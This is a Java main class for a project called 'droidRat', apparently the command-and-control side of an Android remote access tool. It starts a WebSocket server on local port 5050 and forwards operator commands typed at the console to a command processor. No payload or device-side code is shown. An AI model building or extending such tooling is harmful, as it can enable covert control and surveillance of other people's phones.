package com.je_chen.droidRat.main;

import com.je_chen.droidRat.module.WebSocketServerEndPoint;
import com.je_chen.droidRat.module.process.send.command.process_super.CommandProcess;
import org.glassfish.tyrus.server.Server;

import javax.websocket.DeploymentException;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Main {

    static CommandProcess commandProcess;

    public static void main(String[] argv) {
        commandProcess = new CommandProcess();
        System.out.println(
                        "██████╗ ██████╗  ██████╗ ██╗██████╗ ██████╗  █████╗ ████████╗             ██╗███████╗\n" +
                        "██╔══██╗██╔══██╗██╔═══██╗██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝             ██║██╔════╝\n" +
                        "██║  ██║██████╔╝██║   ██║██║██║  ██║██████╔╝███████║   ██║                ██║█████╗  \n" +
                        "██║  ██║██╔══██╗██║   ██║██║██║  ██║██╔══██╗██╔══██║   ██║           ██   ██║██╔══╝  \n" +
                        "██████╔╝██║  ██║╚██████╔╝██║██████╔╝██║  ██║██║  ██║   ██║  ███████╗╚█████╔╝███████╗"
        );
        Run();
    }

    public static void Run() {
        try {
            Server server = new Server("localhost", 5050, "", null, WebSocketServerEndPoint.class);
            String Control_String;
            try {
                server.start();
                System.out.println("Input exit to stop the server.");
                do {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
                    Control_String = reader.readLine();
                    commandProcess.processCommand(Control_String);
                } while (!Control_String.equals("exit"));
            } catch (IOException | DeploymentException e) {
                e.printStackTrace();
            } finally {
                server.stop();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
